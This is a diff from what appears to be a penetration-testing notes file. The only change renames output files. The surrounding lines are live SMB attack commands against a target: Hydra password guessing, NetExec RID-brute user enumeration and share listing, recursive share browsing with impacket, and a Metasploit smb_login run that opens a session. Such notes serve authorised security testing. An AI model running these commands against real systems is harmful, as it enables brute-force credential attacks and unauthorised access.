@@ -362,7 +362,7 @@ hydra -L usernames -e ns smb2://$TARGET -t35 2>/dev/null | awk '{print $5}' > SM
 (nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 
-smbclient -L //$TARGET -U '$USERNAME'%'$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > smbcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile smbcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee smbfiles
+smbclient -L //$TARGET -U '$USERNAME'%'$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > SMBcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile SMBcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee SMBfiles
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
